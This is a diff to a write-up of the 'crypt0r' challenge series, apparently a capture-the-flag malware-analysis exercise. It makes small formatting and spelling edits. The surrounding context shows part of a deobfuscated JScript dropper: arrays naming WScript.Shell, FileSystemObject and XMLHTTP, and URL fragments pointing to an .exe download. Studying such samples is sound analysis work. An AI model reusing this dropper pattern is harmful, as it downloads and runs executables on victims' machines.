@@ -1,9 +1,7 @@
+#Cryptor 1
 
 _If you reach the top of the mountain, find yet another._
-    -- _Super Street Fighter 2 - Fei Long_
-
-
-#Cryptor 1
+    -- Super Street Fighter 2 - Fei Long
 
 This is a series of three challenges, crypt0r 1, 2 and 3.
 
@@ -76,7 +74,7 @@ js> String.fromCharCode(118, 97, 114, 32, 106, 32, 61, 32, 91, 34, 87,
 js>
 ```
 
-In a beutified form:
+In a beautified form:
 ```
 "var j = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
 var u = ["aaacc.", ":/", "gpozgzejgozj", "glkrgjoegjnfozpkfpze", "top", "win32", "crypt0r", "binaries", "sweetvpn", ".", "arch", "exe", "http", "/"];
